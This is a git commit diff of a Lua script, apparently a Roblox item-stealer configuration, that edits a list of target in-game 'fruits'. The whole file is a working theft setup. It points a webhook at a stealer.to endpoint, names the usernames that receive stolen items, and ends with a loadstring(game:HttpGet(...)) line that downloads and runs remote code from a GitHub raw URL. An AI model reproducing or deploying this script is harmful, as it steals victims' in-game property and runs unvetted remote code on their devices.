d877bcbc95697717eaef9200fe9fb25e9c933d2f
wazure-spec <paulcampbellguyana9@gmail.com>
2025-03-23 23:25:29 -0400

    Update wazure.lua

--- wazure.lua
+++ wazure.lua
@@ -1,6 +1,6 @@
 lua
 Webhook = "https://stealer.to/post?uniqueid=db584f13 -- << Your Webhook
 Usernames = {"Envixity_402", "Envixity_402"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas",} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
